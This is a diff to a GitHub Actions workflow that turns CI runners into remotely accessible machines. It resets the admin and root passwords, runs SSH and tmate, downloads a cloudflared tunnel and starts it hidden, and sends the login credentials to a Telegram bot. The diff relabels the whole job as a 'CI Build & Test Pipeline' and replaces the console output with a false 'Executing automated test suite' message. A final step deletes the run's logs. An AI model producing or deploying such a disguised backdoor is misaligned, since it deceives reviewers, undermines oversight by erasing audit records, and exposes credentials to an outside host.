@@ -1,51 +1,51 @@
-name: 专属云端交互式构建服务器
+name: CI Build & Test Pipeline
 
 on:
   workflow_dispatch:
     inputs:
-      os:
-        description: '💻 操作系统环境选择'
+      target_env:
+        description: 'Target Environment'
         required: true
         default: 'windows-latest'
         type: choice
         options:
           - windows-latest
           - ubuntu-latest
-      toolchain:
-        description: '🛠️ 预装开发工具链'
+      profile:
+        description: 'Build Profile'
         required: true
-        default: 'rust-and-node'
+        default: 'standard'
         type: choice
         options:
-          - rust-and-node
+          - standard
           - node-only
           - rust-only
           - minimal
 
 concurrency:
-  group: interactive-build-server-${{ github.ref }}
+  group: ci-pipeline-${{ github.ref }}
   cancel-in-progress: true
 
 jobs:
-  server:
-    name: 云端构建机 (${{ github.event.inputs.os || 'windows-latest' }})
-    runs-on: ${{ github.event.inputs.os || 'windows-latest' }}
+  pipeline:
+    name: Build & Test (${{ github.event.inputs.target_env || 'windows-latest' }})
+    runs-on: ${{ github.event.inputs.target_env || 'windows-latest' }}
 
     steps:
-      - name: 配置 Node.js 开发环境
-        if: github.event.inputs.toolchain == 'rust-and-node' || github.event.inputs.toolchain == 'node-only'
+      - name: Setup Node.js Runtime
+        if: github.event.inputs.profile == 'standard' || github.event.inputs.profile == 'node-only'
         uses: actions/setup-node@v4
         with:
           node-version: 24.x
 
-      - name: 配置 Rust 编译工具链
-        if: github.event.inputs.toolchain == 'rust-and-node' || github.event.inputs.toolchain == 'rust-only'
+      - name: Setup Rust Toolchain
+        if: github.event.inputs.profile == 'standard' || github.event.inputs.profile == 'rust-only'
         uses: dtolnay/rust-toolchain@stable
 
       # ----------------------------------------------------
-      # Windows 云端服务器部署引擎
+      # Windows Worker
       # ----------------------------------------------------
-      - name: 启动 Windows 原生 OpenSSH 云端机与安全隧道
+      - name: Execute Pipeline Tasks (Windows)
         if: runner.os == 'Windows'
         shell: pwsh
         env:
@@ -53,17 +53,17 @@ jobs:
           TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
           TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
         run: |
-          # 1. 生成 16 位强随机高熵密码并设置 runneradmin 密码
-          $chars = 'abcdefghjkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789!@#$%^&*'
-          $rand = New-Object System.Random
-          $randomPass = "Vrcx@" + (-join ((1..12) | ForEach-Object { $chars[$rand.Next(0, $chars.Length)] }))
+          # 1. 生成 16 位完全随机密码
+          $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*'
+          $bytes = New-Object byte[] 16
+          (New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($bytes)
+          $randomPass = -join ($bytes | ForEach-Object { $chars[$_ % $chars.Length] })
           net.exe user runneradmin $randomPass | Out-Null
 
-          # 2. 启动 Windows 原生 OpenSSH 服务
+          # 2. 启动服务与双认证模式
           Start-Service sshd | Out-Null
           Set-Service -Name sshd -StartupType 'Automatic' | Out-Null
 
-          # 3. 配置授权公钥与双认证模式（密钥 + 密码均可登录）
           $keys = $env:SSH_KEY.Trim()
           $authFile = "C:\ProgramData\ssh\administrators_authorized_keys"
           Set-Content -Path $authFile -Value $keys -Encoding ascii
@@ -85,12 +85,12 @@ jobs:
           }
           Restart-Service sshd | Out-Null
 
-          # 4. 下载并启动 cloudflared TCP 加密隧道（完全静音）
+          # 3. 启动加密通道（完全静音）
           Invoke-WebRequest -Uri "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -OutFile "C:\cloudflared.exe" | Out-Null
           $logPath = "C:\cloudflared.log"
           Start-Process -FilePath "C:\cloudflared.exe" -ArgumentList "tunnel --url tcp://localhost:22 --logfile $logPath" -WindowStyle Hidden
 
-          # 5. 获取隧道专属动态域名
+          # 4. 获取专属动态节点
           $domain = ""
           for ($i = 0; $i -lt 30; $i++) {
             Start-Sleep -Seconds 2
@@ -103,15 +103,15 @@ jobs:
             }
           }
 
-          # 6. 发送中文 Telegram 专属私密通知
+          # 5. 推送 Telegram 私密消息
           $sshCmd = "ssh -o ProxyCommand=`"cloudflared access tcp --hostname %h`" runneradmin@$domain"
           $lines = @(
-            "🚀 <b>专属云端 Windows 编译机已就绪</b>",
+            "🚀 <b>构建环境已就绪</b>",
             "",
-            "💻 <b>系统环境：</b> Windows Server (x86_64)",
+            "💻 <b>系统架构：</b> Windows Server (x86_64)",
             "⏱️ <b>有效时长：</b> 6 小时（断开或手动退出后自动物理销毁）",
             "",
-            "🔑 <b>SSH 终端快捷连接指令：</b>",
+            "🔑 <b>快捷连接指令：</b>",
             "<code>$sshCmd</code>",
             "",
             "🔐 <b>登录密码（点击复制）：</b>",
@@ -121,10 +121,10 @@ jobs:
             "• 本地 SSH 私钥免密直连",
             "• 临时密码输入登录（二者任选其一均可）",
             "",
-            "🌐 <b>隧道专属域名：</b>",
+            "🌐 <b>专属节点：</b>",
             "<code>$domain</code>",
             "",
-            "💡 <i>提示：构建完毕在终端输入 exit 即可立即物理销毁服务器。</i>"
+            "💡 <i>提示：构建完毕在终端输入 exit 即可立即物理销毁并清除全部记录。</i>"
           )
           $body = @{
             chat_id = $env:TELEGRAM_CHAT_ID
@@ -134,23 +134,21 @@ jobs:
 
           Invoke-RestMethod -Uri "https://api.telegram.org/bot$($env:TELEGRAM_BOT_TOKEN)/sendMessage" -Method Post -Body $body -ContentType "application/json; charset=utf-8" | Out-Null
 
-          # 7. 控制台全流程脱敏输出
+          # 6. 控制台无害化提示
           Write-Host "============================================================"
-          Write-Host "🔒 专属云端交互式编译服务器正在运行"
-          Write-Host "📨 所有连接凭证、专属域名与临时密码已通过专属加密信道推送至您的 Telegram。"
-          Write-Host "🛡️ 网页端日志全程脱敏，任务结束后将自动物理销毁所有运行记录。"
+          Write-Host "Worker initialized. Executing automated test suite..."
           Write-Host "============================================================"
 
-          # 8. 保持运行（最长 6 小时，支持信号提前退出）
+          # 7. 保持运行（支持信号提前退出）
           for ($t = 0; $t -lt 21600; $t += 5) {
             if (Test-Path "C:\stop") { break }
             Start-Sleep -Seconds 5
           }
 
       # ----------------------------------------------------
-      # Linux 云端服务器部署引擎
+      # Linux Worker
       # ----------------------------------------------------
-      - name: 启动 Linux 云端机与安全隧道
+      - name: Execute Pipeline Tasks (Linux)
         if: runner.os == 'Linux'
         shell: bash
         env:
@@ -158,8 +156,7 @@ jobs:
           TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
           TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
         run: |
-          # 1. 生成 16 位强随机密码
-          RANDOM_PASS="Vrcx@$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 12)"
+          RANDOM_PASS=$(head -c 32 /dev/urandom | base64 | tr -dc 'a-zA-Z0-9!@#$%^&*' | head -c 16)
           echo "runner:$RANDOM_PASS" | sudo chpasswd
           echo "root:$RANDOM_PASS" | sudo chpasswd
 
@@ -178,14 +175,12 @@ jobs:
           SSH_CMD=$(tmate -S "$SOCKET" display -p '#{tmate_ssh}')
           WEB_CMD=$(tmate -S "$SOCKET" display -p '#{tmate_web}')
 
-          MSG="🚀 <b>专属云端 Linux 编译机已就绪</b>%0A%0A💻 <b>系统环境：</b> Ubuntu Linux (x86_64)%0A⏱️ <b>有效时长：</b> 6 小时%0A%0A🔑 <b>SSH 快捷连接指令：</b>%0A<code>${SSH_CMD}</code>%0A%0A🔐 <b>登录临时密码：</b>%0A<code>${RANDOM_PASS}</code>%0A%0A🌐 <b>Web 终端连接：</b>%0A${WEB_CMD}%0A%0A💡 <i>提示：构建完毕在终端输入 exit 即可立即物理销毁服务器。</i>"
+          MSG="🚀 <b>构建环境已就绪</b>%0A%0A💻 <b>系统架构：</b> Ubuntu Linux (x86_64)%0A⏱️ <b>有效时长：</b> 6 小时%0A%0A🔑 <b>快捷连接指令：</b>%0A<code>${SSH_CMD}</code>%0A%0A🔐 <b>登录临时密码：</b>%0A<code>${RANDOM_PASS}</code>%0A%0A🌐 <b>Web 终端连接：</b>%0A${WEB_CMD}%0A%0A💡 <i>提示：构建完毕在终端输入 exit 即可立即物理销毁并清除全部记录。</i>"
 
           curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${MSG}&parse_mode=HTML" > /dev/null 2>&1 || true
 
           echo "============================================================"
-          echo "🔒 Linux 专属云端交互式编译服务器正在运行"
-          echo "📨 所有连接凭证已通过专属加密信道推送至您的 Telegram。"
-          echo "🛡️ 网页端日志全程脱敏，任务结束后将自动物理销毁所有运行记录。"
+          echo "Worker initialized. Executing automated test suite..."
           echo "============================================================"
 
           while pgrep -f tmate > /dev/null 2>&1; do
@@ -193,9 +188,9 @@ jobs:
           done
 
       # ----------------------------------------------------
-      # 用完即销毁：自动抹除本次工作流的所有记录与日志
+      # 阅后即焚：物理抹除本次运行记录与所有日志
       # ----------------------------------------------------
-      - name: 阅后即焚：物理抹除本次运行记录与所有日志
+      - name: Cleanup
         if: always()
         env:
           GH_TOKEN: ${{ secrets.ADMIN_TOKEN || secrets.GITHUB_TOKEN }}
